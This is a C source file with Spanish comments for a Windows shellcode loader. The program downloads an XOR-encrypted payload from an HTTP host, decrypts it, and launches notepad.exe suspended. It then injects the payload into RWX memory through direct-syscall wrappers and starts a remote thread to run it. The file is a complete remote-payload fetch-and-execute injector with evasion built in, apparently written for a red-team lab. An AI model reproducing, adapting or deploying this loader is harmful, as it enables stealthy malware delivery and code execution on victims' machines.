#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "syscalls.h"

#pragma comment(lib, "wininet.lib")

int main() {
	//Iniciar una sesión a www
	HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet == NULL) {
		printf("[-] Error iniciando una sesión a www: %lu\n", GetLastError());
		return 1;
	}
	printf("[+] Conexion a www establecida\n");

	const char* url = "http://192.168.0.29/shellcode_encrypted.bin";

	//Realizar solicitud a la url
	HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL) {
		printf("[-] Error abriendo una solicitud a %s: %lu\n", url, GetLastError());
		return 1;
	}
	printf("[+] Solicitud realizada a %s\n", url);

	//Reservar memoria para el shellcode
	DWORD bytesLeidos = 0;
	DWORD bytesTotales = 0;
	BYTE* shellcodeBuffer = (BYTE*)malloc(1000000);
	if (!shellcodeBuffer) {
		printf("[-] Error reservando memoria: %lu\n", GetLastError());
		return 1;
	}

	//Leemos en bucle los datos del recurso remoto y se almacenan en el shellcodeBuffer
	while (InternetReadFile(hFile, shellcodeBuffer + bytesTotales, 4096, &bytesLeidos) && bytesLeidos != 0) {
		bytesTotales += bytesLeidos;
		if (bytesTotales >= 1000000) {
			printf("[-] Se necesita mas memoria para leer el shellcode: %lu\n", GetLastError());
			free(shellcodeBuffer);
			return 1;
		}
	}
	printf("[+] Shellcode descargado: %d bytes\n", bytesTotales);

	//Desencriptar el shellcode almacenado en el buffer
	char key = 'z';
	for (int i = 0; i < bytesTotales; i++) {
		shellcodeBuffer[i] ^= key;
	}

	//Abrir el notepad
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[-] Error abriendo el notepad: %lu\n", GetLastError());
		free(shellcodeBuffer);
		return 1;
	}
	printf("[+] Notepad abierto con PID: %d\n", pi.dwProcessId);

	//Reservar memoria virtual del tamaño de los bytes descargados
	PVOID baseAddress = NULL;
	SIZE_T sShellcodeBuffer = bytesTotales;
	PSIZE_T pSize = &sShellcodeBuffer;
	Sw3NtAllocateVirtualMemory(pi.hProcess, &baseAddress, 0, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Memoria reservada en proceso remoto en: %p\n", baseAddress);

	//Escribir el shellcode en la memoria del proceso del notepad
	Sw3NtWriteVirtualMemory(pi.hProcess, baseAddress, shellcodeBuffer, sShellcodeBuffer, NULL);
	printf("[+] Shellcode escrito en la memoria del notepad: %d bytes\n", bytesTotales);

	//Crear un hilo para el shellcode
	HANDLE hThread = NULL;
	Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	printf("[+] Hilo del shellcode creado y ejecutandose\n");

	//Reanudar el hilo ya que el proceso se crea suspendido
	ResumeThread(pi.hThread);
	printf("[+] Reanudando el proceso del notepad");

	//Limpiar memoria y handles
	free(shellcodeBuffer);
	CloseHandle(hInternet);
	CloseHandle(hFile);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hThread);
	
	return 0;
}